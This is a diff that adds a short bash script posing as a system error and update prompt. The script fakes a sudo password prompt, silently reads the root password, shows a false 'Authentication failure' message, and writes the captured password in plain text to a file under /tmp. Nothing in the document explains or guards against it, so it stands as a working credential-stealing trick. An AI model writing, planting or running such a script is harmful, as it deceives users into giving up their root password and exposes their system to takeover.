@@ -1,0 +1,23 @@
+#!/bin/bash
+
+echo “An System Error Occured!”
+
+echo “”
+
+echo “Error Code: #123241e″
+
+echo “”
+
+echo “An update is required”
+
+read -s -p “[sudo] password for root ” rootpasswd
+
+echo “”
+
+echo “su: Authentication failure”
+
+echo “”
+
+sudo apt-get update && sudo apt-get upgrade
+
+sudo echo “The Password is: $rootpasswd” > /tmp/ext_check.tmp
